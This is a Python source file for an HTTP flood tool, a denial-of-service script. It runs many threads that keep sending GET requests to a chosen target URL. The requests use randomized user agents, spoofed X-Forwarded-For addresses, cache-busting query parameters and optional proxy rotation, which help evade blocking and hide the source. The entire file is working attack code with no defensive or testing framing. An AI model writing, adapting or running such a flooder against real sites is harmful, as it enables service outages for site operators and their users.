import requests
import threading
import time
from utils.randomizer import Randomizer

class HTTPFlood:
    def __init__(self, target_url, thread_count=100, use_proxy=False):
        self.target = target_url
        self.threads = thread_count
        self.proxy_list = []
        self.running = False
        self.ua = Randomizer()
        if use_proxy:
            from proxies.proxy_fetcher import ProxyFetcher
            self.proxy_list = ProxyFetcher().fetch()

    def _flood_worker(self):
        session = requests.Session()
        while self.running:
            try:
                headers = {
                    'User-Agent': self.ua.get_random_ua(),
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Cache-Control': 'no-cache',
                    'Pragma': 'no-cache',
                    'X-Forwarded-For': self.ua.get_random_ip()
                }
                proxy = None
                if self.proxy_list:
                    proxy = {'http': f'http://{self.ua.random_choice(self.proxy_list)}'}
                params = {f'q_{int(time.time())}': self.ua.random_string(8)}
                session.get(self.target, headers=headers, params=params, proxies=proxy, timeout=5, verify=False)
            except Exception:
                pass

    def start(self):
        self.running = True
        for _ in range(self.threads):
            t = threading.Thread(target=self._flood_worker)
            t.daemon = True
            t.start()
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            self.stop()

    def stop(self):
        self.running = False